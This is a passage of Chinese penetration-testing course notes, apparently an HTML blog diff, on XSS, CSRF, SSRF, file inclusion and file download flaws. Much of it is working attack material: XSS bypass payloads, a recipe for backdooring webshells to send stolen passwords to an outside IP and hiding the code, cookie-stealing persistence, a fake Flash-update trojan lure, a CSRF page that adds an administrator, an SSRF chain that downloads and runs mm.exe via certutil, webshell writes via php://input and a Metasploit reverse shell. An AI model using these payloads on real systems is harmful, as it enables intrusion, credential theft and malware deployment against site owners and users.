class="line">  - ```python</span><br><span class="line">    &lt;script&gt;alert(1)&lt;/script&gt; 普通&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;//  闭合&#x27; onclick=alert(1) // 闭合事件，这里的2个斜杠代表着注释#如果尖括号被过滤（实体化），可以尝试使用事件来触发&quot; onclick=alert(1) // 闭合事件#如果事件的关键字被过滤，可以尝试其他的事件，参考文章https://xz.aliyun.com/t/2936  这里面有很多其他的事件&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;aa&lt;/a&gt; // 闭合自定义&quot;&gt;&lt;sCript&gt;alert(1)&lt;/scRipt&gt; //html大小写</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>#案例4-项目自动探针&amp;手工Fuzz发包</p>
+<ul>
+<li><p>参考链接</p>
+<ul>
+<li><p>xss识别工具：<a href="https://github.com/s0md3v/XSStrike">https://github.com/s0md3v/XSStrike</a></p>
+<ul>
+<li><p>特点：能fuzz，能识别waf，能绕过waf，xss专用工具</p>
+</li>
+<li><p>缺点：没有人工那么智能，有时候一些地方跑不出来</p>
+</li>
+<li><p>批量扫描：</p>
+<ul>
+<li>```python<br>python3 xsstrike.py –seeds urls.txt<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  - 手工fuzz</span><br><span class="line"></span><br><span class="line">    - 优点：能测出一些工具跑不出来的xss</span><br><span class="line">    - xss的fuzz字典：https://github.com/TheKingOfDuck/fuzzDicts</span><br><span class="line">    - 手工方法：</span><br><span class="line">      - 将payload的位置加变量，然后加载字典即可</span><br><span class="line"></span><br><span class="line">- 使用建议：</span><br><span class="line"></span><br><span class="line">  - 推荐工具+手工fuzz，就能跑出大部分的xss了</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">技巧：怎么获取免费的在线靶场？</span><br><span class="line"></span><br><span class="line">- [靶场训练 (ikillyou.top)](https://bachang.ikillyou.top/)</span><br><span class="line"></span><br><span class="line">- 在fofa里搜索靶场的关键字，可以是靶场里的内容，也可以是靶场url里的关键字，比如我们这里使用的xsslabs</span><br><span class="line">  - ![image-20210805203504172](/source/images/image-20210805203504172.png)</span><br><span class="line">- 可以直接在fofa里搜索url里的关键字xsslabs，即可获取别人搭建的靶场</span><br><span class="line">  - ![image-20210805203646965](/source/images/image-20210805203646965.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 27、XSS红队盲打&amp;蓝队钓鱼直打&amp;权限维持</span><br><span class="line"></span><br><span class="line">关于红蓝队环境安装：https://github.com/ffffffff0x/f8x</span><br><span class="line"></span><br><span class="line">- 功能：支持一键安装红队和 蓝队的需要的环境</span><br><span class="line">- ![image-20210806133210501](/source/images/image-20210806133210501.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">xss直打和盲打</span><br><span class="line"></span><br><span class="line">- 直打：可以看的见返回的数据，比如xss成功或者失败，我们可以根据显示结果，再来尝试绕过</span><br><span class="line"></span><br><span class="line">  - 留言板</span><br><span class="line">  - 评论</span><br><span class="line">  - </span><br><span class="line"></span><br><span class="line">- 盲打：xss打过去，不知道会不会成功，没有返回的结果显示，所以没有绕过这一说法</span><br><span class="line"></span><br><span class="line">  - 与客服的聊天窗口</span><br><span class="line"></span><br><span class="line">  - 意见反馈（我们用户看不到并且只有官方才能看的到的那种）</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">#案例1-红队盲打-目标webshell箱子反杀记webshell大全：https://github.com/tennc/webshell#情节：网上有的作者很坏，免费分享各种webshell，但是这种webshell里却带有后门，当我们使用他的webshell拿下权限并且登录后，对方的webshell会将我们获取的webshell地址和密码发送给作者，所以我们相当于给别人打工了收信：http://47.94.236.117/admin/login.asp      #这个是作者用来储存它的带后门的webshell发送过来的网站#小白中招流程与反制	1、喜滋滋的得到了“好心人”发布的牛逼的webshell    2、经过苦战，拿下网站的权限，下面是shell地址，和密码		被控：http://test.xiaodi8.com/1.php angel    3、小白开始登录shell，输入密码    4、GG，小白中招了，在小白登录webshell的一瞬间，该webshell向远程的一个地址发送了信息，信息的内容就是小白刚刚获取的webshell地址和密码    5、至此，小白相当于给那个“好心的作者”打工了，自己获取到的shell和密码，结果作者也白嫖到了    6、恰巧，小白的同事小迪经过，根据经验分析，觉得小白很可能中招了，小迪在小白的webshell页面打开审查元素界面，并且刷新，发现了一个异常请求		http://47.94.236.117/api.asp?url=http://test.xiaodi8.com/phpspy2010.php&amp;pass=angel&amp;id=1    7、该请求是将shell的地址和密码发送到一个ip为47.94.236.117 的地址，此时小白欲哭无泪，求助小迪，于是小迪开始教小白怎么反制作者    8、因为作者会接收后门返回的shell地址和密码，很有可能会被集体存储在一个页面，所以我们可以用 xss进行反制    9、在异常请求的密码处构造payload，插入xss代码，这样一旦作者登录后台查看今天的收成时，对方很有可能中招，我们由此可以获取到对方储存webshell的地址的账户和密码，由此收获一大批webshell，payload如下：（这里的xss代码可以从xss在线平台获取）    http://47.94.236.117/api.asp?url=http://www.xiaodi8.com/phpspy2010.php&lt;sCRiPt sRC=https://xss.pt/Wrjg&gt;&lt;/sCrIpT&gt;&amp;pass=angel&lt;sCRiPt sRC=https://xss.pt/Wrjg&gt;&lt;/sCrIpT&gt;&amp;id=1    10、到了下午，小白的xss明显被成功触发，因为他在它的xss平台获取到了一个地址和cookie，登录进去发现了大量的webshell    	</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#怎么制作带后门的webshell1、首先找到一个正常的webshell2、编辑webshell，因为正常的webshell都几乎会获取到shell地址和设置shell密码，这些都在webshell文件里有，所以我们只需要使用下面的语句插入进去，一个带后门的webshell就制作成功了echo &quot;&lt;script src=&#x27;http://47.94.236.117/api.asp?url=$url&amp;pass=$admin[&#x27;pass&#x27;]&#x27;&gt;&lt;/script&gt;&quot;;#这里的变量$url和$admin[&#x27;pass&#x27;]  都是webshell里的变量，当我们制作带后门的webshell时，需要根据实际情况修改#怎么防止别人发现webshell里的后门？只需要将后门代码进行加密即可</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="/source/images/image-20210806130753815.png" alt="image-20210806130753815"></li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#案例2-蓝队直打-目标hook配合钓鱼反杀记蓝队a：	任务：保护网站test.xiaodi8.com 网站红队b：	任务：攻击test.xiaodi8.com 网站1、为了防止网站被红队攻击，蓝队a在test.xiaodi8.com的网站首页插入了beef的上线payload	https://github.com/beefproject/beef/wiki/Installation#docker-setup      #通过docker安装beef2、这样一旦有恶意攻击者访问该页面，就会中招，在蓝队的beef里上线，想到这里，蓝队觉得还不够，蓝队还想拿下红队b的攻击电脑的权限，于是蓝队a想通过flash钓鱼来攻击红队b，于是蓝队下载了项目Flash-Pop，Flash-Pop 是一个flash钓鱼的页面，只需要将其下载下来，解压放到网站即可。	https://github.com/r00tSe7en/Flash-Pop      #这是flash的钓鱼页面，只需要将其下载下来，解压放到网站即可3、为了配合flash钓鱼，蓝队a使用css生成了exe木马，为了falsh钓鱼的真实性，蓝队a对exe木马的图标和相关信息进行了修改	Restorator 资源文件加工，可以修改软件，比如exe文件的一些信息，图标等等，该软件在迪哥的资料包里有，第二课的资料包4、下午，红队b心情不好，决定开始攻击test.xiaodi8.com 网站，一访问，蓝队a那里就发现红队b在自己的beef里上线了，立马实行跳转的payload，跳转到：http://test.xiaodi8.com/flash/  而该页面，就是刚刚从项目Flash-Pop里下载下来的，该页面十分逼真，会提示更新flash，红队b看到后，想也不想的下载更新了，因为他心情不好，所以想快点升级完接着攻击网站test.xiaodi8.com5、下载到电脑，看到这个flash程序，红队b还是有警惕心理的，自己看了看flash的相关信息、图标，没发现什么问题，双击安装6、“哈哈，总算抓到红队了”，蓝队a大笑到，因为红队b刚刚运行了伪装成flash.exe的木马程序，蓝队a的css里已经看到一台主机上线了，通过css可以查看红队b的电脑文件、屏幕截图等等#升级玩法：	1、可以对木马程序进行免杀    2、可以对木马程序的版本信息、作者进行修改，让其和真正的flash程序保持一致，增加真实性    3、可以将木马程序和官方版本的flash文件进行捆绑，这样用户点击木马，真正的flash程序也会执行，这样更加的真实</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#案例3-红队技能-利用Xss+Cookie权限维持Webshell箱子配合xss平台使用, 在红蓝对抗里面 ，红队经常要控制权限，其中web权限大部分都采用的shell控制， 但是shell会出现被删除，被拦截，被查杀等情况，漏洞也有可能被找到修复到，那么下一次控制的机会就基本没有了.所以我们利用一个小技巧，将盗取cookie的js代码植入到后台登录成功的文件中去，实现每个登录成功的操作都会将其cookie发送到平台，这样实现了长期的控制，并且这个代码不会被查杀 拦截 等情况 安全完美，条件：你获的的webshell权限之后的事情#举例子：127.0.0.1/login.php  这是登录的页面     127.0.0.1/index.php 这是登录成功的页面，所以我们的xss代码插在index.php文件里最好，因为这是登录成功才会发送cookie，如果插在login.php，登录失败也会发送cookie，而登陆失败的cookie我们肯定不需要，所以啊，我们拿到shell，为了维持权限，找到一个登录成功后的文件，插入xss代码，比如这里就是在index.php里插入</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="28、CSRF-amp-SSRF协议-amp-内网探针-amp-漏洞利用"><a href="#28、CSRF-amp-SSRF协议-amp-内网探针-amp-漏洞利用" class="headerlink" title="28、CSRF&amp;SSRF协议&amp;内网探针&amp;漏洞利用"></a>28、CSRF&amp;SSRF协议&amp;内网探针&amp;漏洞利用</h2><p>#案例1-CSRF-后台自动添加管理员</p>
+<ul>
+<li><p>原理：当我们发现一个目标站，接着的登录该目标站，管理员或者普通用户登录都可以，接着登录进去抓包分析里面的各种操作，比如转账、添加信息或者添加账户、删除等操作的数据包我们可以抓包看一下，然后观察这些数据包里有没有设置session，如果没有，那么就可以尝试构造csrf，构造后，如果被攻击者正在处于登录状态的浏览该网站，我们只需要将我们构建的csrff恶意页面发送给对方，对方如果打开了，那么对方就会触发csrf漏洞</p>
+</li>
+<li><p>防护手段：</p>
+<ul>
+<li>设置session</li>
+<li>设置验证码</li>
+<li>设置同源策略</li>
+</ul>
+</li>
+<li><p>csrf在src挖掘中的应用</p>
+<ul>
+<li>当我们发现该网站的请求数据包里没有session的时候，可以尝试创建2个普通账户，然后进行csrf操作</li>
+</ul>
+</li>
+<li><p>前提：</p>
+<ul>
+<li>被攻击者必须要在网站登录的状态下，比如后台</li>
+<li>攻击者必须了解他攻击的网站的一些情况，比如添加管理员的数据包</li>
+</ul>
+</li>
+<li><p>场景说明：见讲解</p>
+<ul>
+<li><p>我正在后台玩耍时，突然群内小伙子发给我一个网站，说上面有好东西，我打开了！</p>
+</li>
+<li><p>我正在浏览的网站，并且已经登录：<a href="http://47.94.236.117/admin/index.asp">http://47.94.236.117/admin/index.asp</a></p>
+</li>
+<li><p>小伙子给我的网站（该网站有恶意代码）：<a href="http://test.xiaodi8.com/add.html">http://test.xiaodi8.com/add.html</a></p>
+<ul>
+<li>```html<html>    <head lang="en">    <title>csrf_post</title>    <script>    window.onload = function() {    document.getElementById("postsubmit").click();  } </script></head><body>       <form action="http://47.94.236.117/admin/addadminuser.asp?action=add"  method="POST">            <input type="text" name="username" value="xiaodi"><br>            <input type="hidden" name="password" value="xiaodi"><br>            <input type="hidden" name="password1" value="xiaodi"><br>            <input id="postsubmit" type="submit" name="submit" value="submit" />       </form></body></html>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  - 当我访问上面这些代码构成的恶意页面，我之前正在访问的网站就会自动添加一个账户名和密码都为xiaodi的管理员账户</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">\#案例2-SSRF-利用各种协议信息探针</span><br><span class="line"></span><br><span class="line">- ssrf存在的地方：核心就是加载远程连接（url）的地方，比如加载远程图片、远程网页等等</span><br><span class="line">  - 从功能上查找</span><br><span class="line">    - 分享：通过url地址分享网页内容</span><br><span class="line">    - 转码服务：通过url地址把源地址的网页内容调优使其适合收集</span><br><span class="line">    - 在线翻译：通过url地址翻译该地址对应的文本的内容，提供此功能的有百度、有道</span><br><span class="line">    - 图片加载与下载：通过url地址加载或者下载图片</span><br><span class="line">    - 图片、文章收藏功能</span><br><span class="line">    - 未公开的api实现以及其他调用url的功能</span><br><span class="line">  - 从url关键字查找</span><br><span class="line">    - share</span><br><span class="line">    - wap</span><br><span class="line">    - url</span><br><span class="line">    - link</span><br><span class="line">    - src</span><br><span class="line">    - source</span><br><span class="line">    - target</span><br><span class="line">    - u</span><br><span class="line">    - 3g</span><br><span class="line">    - display</span><br><span class="line">    - sourceURI</span><br><span class="line">    - imageURL</span><br><span class="line">    - domain</span><br><span class="line">- ssrf的验证：</span><br><span class="line">  - burpsuit抓包，看它是否请求了一个其他的url地址</span><br><span class="line">  - 右键打开图片，看图片的地址是否是一个url</span><br><span class="line">- ssrf的绕过</span><br><span class="line">  - 使用@符号，比如:http://cehshi.com@10.10.10.10   在@符号前，放上一个正常的地址，@符号后放上我们要探测的ip</span><br><span class="line">  - ip地址转换：将ip地址转换为十进制数字</span><br><span class="line">- 特点：最主要的作用是进行信息的收集，然后可以根据收集的信息，比如内网的其他机器以及其他机器运行的服务，并在网络上搜索看这些服务是否有历史漏洞，然后利用</span><br><span class="line">- 分类：</span><br><span class="line">  - 有回显：比较简单</span><br><span class="line">  - 无回显：利用复杂，后续迪哥的ctf课程会讲</span><br><span class="line">- 定义：网站a存在ssrf漏洞，我们可以通过该漏洞探测和网站a所在的服务器a下的同一个局域网下的其他机器，同时也可以读取服务器a的端口，开启的各项服务、本地的文件等等</span><br><span class="line">- ssrfSSRF漏洞(原理&amp;绕过姿势)：https://www.t00ls.net/articles-41070.html</span><br><span class="line">- ssrf的功能：端口扫描&amp;指纹识别&amp;内网探针&amp;漏洞利用等</span><br><span class="line">- ssrf案例讲解</span><br><span class="line">  - 假设网站：127.0.0.1:8081/ssrf.php  存在ssrf存在漏洞</span><br><span class="line">  - 1、首先修改请求的网址，比如加载的远程的地址，将其改为：http://127.0.0.1:8081/phpmyadmin/  这是探测对方8081端口是否开启了phpadmin</span><br><span class="line">  - 2、读取文件file:///D:/www.txt</span><br><span class="line">  - 3、探测对方是否开启了3306端口：dict://192.168.46.133:3306/info</span><br><span class="line">  - 读取对方的ftp服务器里的文件：ftp://192.168.46.133:21</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ssrf不同的脚本语言支持的各种协议</span><br><span class="line"></span><br><span class="line">- ​                 ![img](https://qqadapt.qpic.cn/txdocpic/0/fa474aba6ed4a6d93fac52b4993fe7cd/0?w=440&amp;h=527)        </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">\#案例3-SSRF-信息探针&amp;漏洞利用&amp;权限</span><br><span class="line"></span><br><span class="line">- 通过ssrf获取内网内的其他机器的权限</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+场景说明：网站127.0.0.1:8081/ssrf_exp.php 存在ssrf漏洞，并且在该网站所在的服务器所处的局域网内还有其他机器，我们的目标就是获取其他机器的权限1、发现了存在ssrf的网站：127.0.0.1:8081/ssrf_exp.php2、进行信息探测：    通过构造payload：http://192.168.0.1   将内网的ip段做成字典，内网ip段参考下文，如果存在该ip，并且该ssrf是回显ssrf的话，会有数据回显，此时探测到内网ip：192.168.46.133    接着进行探测端口，一样的，192.168.46.133:x   将x做成字典，然后进行探测，经过探测，发现端口8080，该端口发现了hfs服务3、根据探测到的服务，进行利用，百度搜索hfs漏洞利用，发现hfs有命令执行漏洞4、那么接下来可以利用命令执行添加一个账户和密码：http://192.168.46.133:8080//?search==%00{.exec|cmd /c net user hack 123 /add.} 5、问题来了，我们创建了账户却无法直接连接，因为192.168.46.133处于内网，所以我们无法直连，只能让该服务器反连，有两种思路：    思路一：让该内网机器下载后门，下载后，通过命令执行，让它执行后门    思路二：让虚拟机下载转发脚本，执行转发脚本转发shell出来    推荐：推荐思路一6、通过css制作后门，然后将它放到我们的服务器上，使其可以通过url下载：    后门地址：    http://47.94.236.117/mm.exe 7、通过命令执行，使内网机器下载后门    下载EXE后门：    http://192.168.46.133:8080/?search==%00{.exec|cmd.exe%20/c%20certutil%20-urlcache%20-split%20-f%20http://47.94.236.117/mm.exe.}  8、通过命令执行，让内网机器执行后门    执行EXE后门：    http://192.168.46.133:8080/?search==%00{.exec|mm.exe.} 9、上线成功
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- 内网ip段</span><br><span class="line"></span><br><span class="line">  - ```</span><br><span class="line">    以下IP段的地址都是内网IP地址。（1）10.0.0.0 到 10.255.255.255（2）172.16.0.0 到172.31.255.255（3）192.168.0.0 到192.168.255.255</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>#案例4-SSRF-某实际案例测试演示(功能)</p>
+<ul>
+<li>SSRF漏洞(原理&amp;绕过姿势)<ul>
+<li><a href="https://www.t00ls.net/articles-41070.html">https://www.t00ls.net/articles-41070.html</a></li>
+</ul>
+</li>
+</ul>
+<h2 id="29、文件包含-amp-LFI-amp-RFI-amp-协议利用"><a href="#29、文件包含-amp-LFI-amp-RFI-amp-协议利用" class="headerlink" title="29、文件包含&amp;LFI&amp;RFI&amp;协议利用"></a>29、文件包含&amp;LFI&amp;RFI&amp;协议利用</h2><p>#知识点：</p>
+<ul>
+<li>1、解释-什么是文件包含<ul>
+<li>定义：<ul>
+<li>是开发者在开发中为了一些文件和功能的复用而采用的一种方法，通过文件包含，可以提高工作效率，对于相同的功能，只需要将其写成一个模块，以后调用的时候直接包含该文件即可，而不需要每次调用都重新写大量的代码</li>
+</ul>
+</li>
+<li>特性：<ul>
+<li>被包含的文件，都会被解析，文件内容是什么格式的，就会按照什么格式解析，比如1.txt里包含php一句话木马，如果包含1.txt，它也会按照php解析</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>2、应用-为什么会出现包含<ul>
+<li>变量名可控</li>
+</ul>
+</li>
+<li>3、分类-本地LFI&amp;远程RFI</li>
+<li>4、利用-过滤无过滤&amp;伪协议</li>
+</ul>
+<p>文件包含可能存在的情况：</p>
+<ul>
+<li>观察url里带等于号 = 后面接的是否是文件或者</li>
+<li>变种文件包含：就是等于号 = 后面接的虽然是文件，但是没有带文件后缀，这样的我们很容易忽略，但是这里也可能存在文件包含的<ul>
+<li>举例：127.0.0.1/index.php?page=login    <ul>
+<li>这里很大概率就是包含login.php文件，之所以没有php后缀，因为它的代码是这样写的：include($_GET[‘file’].’php’)</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>文件包含的检测：</p>
+<ul>
+<li>将上面可能存在文件包含的一些关键字进行替换，比如url：127.0.0.1/index.php?page=login      可以将login替换成index，看页面是否有变化，有就代表此处存在文件包含</li>
+</ul>
+<p>不同操作系统的敏感文件的位置</p>
+<ul>
+<li><h4 id="Windows："><a href="#Windows：" class="headerlink" title="Windows："></a>Windows：</h4><blockquote>
+<p>c:\boot.ini // 查看系统版本<br>c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件<br>c:\windows\repair\sam // 存储Windows系统初次安装的密码<br>c:\ProgramFiles\mysql\my.ini // MySQL配置<br>c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码<br>c:\windows\php.ini // php 配置信息</p>
+</blockquote>
+<h4 id="Linux："><a href="#Linux：" class="headerlink" title="Linux："></a>Linux：</h4><blockquote>
+<p>/etc/passwd // 账户信息<br>/etc/shadow // 账户密码文件<br>/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件<br>/usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置<br>/usr/local/app/php5/lib/php.ini // PHP相关配置<br>/etc/httpd/conf/httpd.conf // Apache配置文件<br>/etc/my.conf // mysql 配置文件</p>
+</blockquote>
+</li>
+</ul>
+<p>文件包含各个脚本代码：</p>
+<ul>
+<li>```<br>ASP,PHP,JSP,ASPX等<!--#include file="1.asp" --><!--#include file="top.aspx" -->&lt;c:import url=”<a href="http://thief.one/1.jsp&quot;&gt;">http://thief.one/1.jsp&quot;&gt;</a>&lt;jsp:include page=”head.jsp”/&gt;&lt;%@ include file=”head.jsp”%&gt;<?php Include('test.php')?><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">本地文件包含的两类写法：LFI</span><br><span class="line"></span><br><span class="line">- ```php</span><br><span class="line">  #将包含的文件名写死include(&#x27;check.php&#x27;)    #这样将文件名写死，就不存在漏洞    #通过变量控制    $file=$_GET[&#x27;filename&#x27;];	include($file);        这种情况我们可以控制变量名来进行包含                #通过变量+指定（写死）后缀控制         $file=$GET[&#x27;filename&#x27;];		include($_GET[&#x27;file&#x27;].&#x27;php&#x27;)         这种情况因为写死了后缀，如果我们继续包含1.txt,那么组合成的文件就是1.txt.php，这样肯定会包含失败，因为不存在该文件，所以我们只能通过截断或者注释的方法来进行绕过          绕过：基于php低版本            	1、直接通过 %00 来进行截断            	需要前提：            			magic_quotes_gpc = Off					   PHP版本&lt; 5.3.4            http://127.0.0.1:8081/include.php?filename=1.txt%00				2、通过构造payload长度来挤掉后门的php后缀，因为url的长度是有限制的，当超过一定的长度，就会导致后面的拼接的代码拼接不上去，从而绕过代码里强制添加的php后缀，我们可以通过 ../   来构造长度                    http://127.0.0.1:8081/include.php?filename=1.txt/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././		绕过：基于php高版本：使用伪协议进行绕过            data://text/plain,&lt;?php%20phpinfo();?&gt;                                </span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>#案例2-RFI-远程文件包含代码测试</p>
+<ul>
+<li>```php<br>1、无过滤情况，直接包含    <a href="http://127.0.0.1:8081/include.php?filename=http://www.xiaodi8.com/readme.txt2%E3%80%81%E5%A6%82%E6%9E%9C%E8%BF%87%E6%BB%A4%E4%BA%86%EF%BC%8C%E6%AF%94%E5%A6%82%E7%B1%BB%E4%BC%BC%E4%BA%8E%E4%B8%8A%E9%9D%A2%E7%9A%84%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB%E4%B8%80%E6%A0%B7%EF%BC%8C%E5%86%99%E6%AD%BB%E4%BA%86%E5%90%8E%E7%BC%80%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%EF%BC%88include($_GET%5B&#39;file&#39;].&#39;php&#39;)%EF%BC%89%EF%BC%8C%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E4%BB%A5%E4%B8%8B%E6%96%B9%E6%B3%95%E7%BB%95%E8%BF%87">http://127.0.0.1:8081/include.php?filename=http://www.xiaodi8.com/readme.txt2、如果过滤了，比如类似于上面的本地包含一样，写死了后缀的情况下（include($_GET[&#39;file&#39;].&#39;php&#39;)），可以通过以下方法绕过</a>    <a href="http://127.0.0.1:8081/include.php?filename=http://www.xiaodi8.com/readme.txt%00">http://127.0.0.1:8081/include.php?filename=http://www.xiaodi8.com/readme.txt%00</a>        #这里的%23代表 #    <a href="http://127.0.0.1:8081/include.php?filename=http://www.xiaodi8.com/readme.txt%23">http://127.0.0.1:8081/include.php?filename=http://www.xiaodi8.com/readme.txt%23</a>    #这里的问号 ？ 代表着将源代码里写死的php后缀当作参数    <a href="http://127.0.0.1:8081/include.php?filename=http://www.xiaodi8.com/readme.txt?%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9%EF%BC%9A%E8%AF%AD%E8%A8%80%E8%AE%BE%E7%BD%AE%E9%87%8C%E9%9D%A2%E6%88%96%E4%BB%A3%E7%A0%81%E9%99%90%E5%88%B6%E4%BC%9A%E5%AF%BC%E8%87%B4%E8%BF%99%E4%B8%AA%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%AB%E7%A6%81%E7%94%A8%EF%BC%8C%E5%9C%A8%E5%AE%9E%E6%88%98%E4%B8%AD%E6%B5%8B%E8%AF%95%E5%8D%B3%E5%8F%AF%EF%BC%81">http://127.0.0.1:8081/include.php?filename=http://www.xiaodi8.com/readme.txt?注意事项：语言设置里面或代码限制会导致这个远程包含禁用，在实战中测试即可！</a>    allow_url_fopen = On（是否允许打开远程文件）    allow_url_include = On（是否允许include/require远程文件）通过从PHP study Pro中的php配置文件来看，此项默认是off。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">\#案例3-协议-各种协议提交包含测试</span><br><span class="line"></span><br><span class="line">- ```php</span><br><span class="line">  文件读取：如果不知道文件地址，可以读取当前页面下的php文件php://filter/convert.base64-encode/resource=1.txt     推荐这一种，这个不需要绝对路径file:///D:/phpstudy/PHPTutorial/WWW/1.txt        这种需要绝对路径RCE执行方法一：1、在url地址栏上拼接：php://input2、在hackbar的Post上输入:&lt;?php system(&#x27;ver&#x27;)?&gt;     不同的操作系统，系统命令不同，需要根据实际情况更换不同的命令    通过input命令执行写入shell：&lt;?PHP fputs(fopen(&#x27;s.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[cmd])?&gt;&#x27;);?&gt;    RCE命令执行方法二：    直接拼接在url上：data://text/plain,&lt;?php%20phpinfo();?&gt;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>#案例4-拓展-LFI实例CMS&amp;RFI结合MSF</p>
+<ul>
+<li>```php<br>#ekucms包含日志getshell基本原理：该cms有文件包含漏洞，当我们构造一个payload会在它的日志下有记录，所以我们完全可以访问该url，构造一个一句话木马，然后使用文件包含漏洞包含它的日志文件，即可成功流程：想办法包含文件-文件来源（能不能上传）不能上传：包含系统自身文件渗透，包含日志文件渗透能上传：吃西瓜#RFI结合MSF-exploit/multi/script/web_delivery基本原理：通过在msf上生成一个可以反弹shell的马，然后将该马通过文件包含的RCE    命令如下：        1、msfconsole        2、use exploit/multi/script/web_delivery   后面接收模块        3、show targets         4、set 1         这是选择php        5、set target 1        6、set payload php/meterpreter_reverse_tcp        7、show options        8、set lhost 192.168.127.189        9、exploit -j         10、接着会输出一串信息            php -d allow_url_fopen=true -r “eval(file_get_contents(‘<a href="http://43.128.27.189.8080/ZBWTxbRMsD1CP&quot;">http://43.128.27.189.8080/ZBWTxbRMsD1CP&quot;</a>            我们只需要获取到双引号里面的内容即可，但是这个payload显示不全，所以需要给他补全            <?php eval(file_get_contents('http://43.128.27.189.8080/ZBWTxbRMsD1CP"));?>        20、接下来就通过在浏览器url后面拼接 php://input  ,并且postpayload，msf那里就可反弹shell            <?php eval(file_get_contents('http://43.128.27.189.8080/ZBWTxbRMsD1CP"));?><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">\#案例5-CTF-初中级比赛真题包含考点</span><br><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  [ACTF2020 新生赛]Includehttps://buuoj.cn/challengesI春秋“百度杯”CTF比赛 2017 二月场 50 includehttps://www.ichunqiu.com/battalion?t=1&amp;r=57475</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>文件包含php的各种伪协议及其适用版本：</p>
+<ul>
+<li><img src="https://qqadapt.qpic.cn/txdocpic/0/3ce53a8a61da628bf2e3f6d60889a9a5/0?w=889&h=328" alt="img">        </li>
+</ul>
+<p>各个脚本语言所支持的伪协议</p>
+<ul>
+<li><img src="https://qqadapt.qpic.cn/txdocpic/0/fa474aba6ed4a6d93fac52b4993fe7cd/0?w=440&h=527" alt="img">        </li>
+</ul>
+<h2 id="30、文件下载-amp-文件读取-amp-文件删除安全"><a href="#30、文件下载-amp-文件读取-amp-文件删除安全" class="headerlink" title="30、文件下载&amp;文件读取&amp;文件删除安全"></a>30、文件下载&amp;文件读取&amp;文件删除安全</h2><p>#知识点：</p>
+<p>1、文件下载&amp;文件读取&amp;文件删除</p>
+<p>2、原理&amp;应用&amp;检测利用&amp;赛题或CMS</p>
+<p>#详细点：</p>
+<p>文件下载</p>
+<ul>
+<li><p>观察url里是否有变量+文件名的情况，如果有，尝试更换文件名，看能否下载其他文件</p>
+</li>
+<li><p>技巧</p>
+<ul>
+<li>有时候明明是一个下载的页面，但是打开后却提示页面找不到，那么我们可以尝试将get请求换成post请求即可下载</li>
+</ul>
+</li>
+<li><p>常规下载URL：<a href="http://www.xiaodi8.com/upload/123.pdf">http://www.xiaodi8.com/upload/123.pdf</a></p>
+</li>
+<li><p>可能存在安全URL：<a href="http://www.xiaodi8.com/xx.xx?file=123.pdf">http://www.xiaodi8.com/xx.xx?file=123.pdf</a></p>
+</li>
+<li><p>利用：常规下载敏感文件（数据库配置，中间件配置，系统密匙等文件信息）</p>
+</li>
+</ul>
+<p>文件读取</p>
+<ul>
+<li>目录遍历：文件和文件夹暴露<ul>
+<li>原因：目录权限或设置有问题</li>
+</ul>
+</li>
+<li>读取类似下载 读取文件内容 小米路由器演示</li>
+<li>利用：常规读取敏感文件（数据库配置，中间件配置，系统密匙等文件信息）</li>
+</ul>
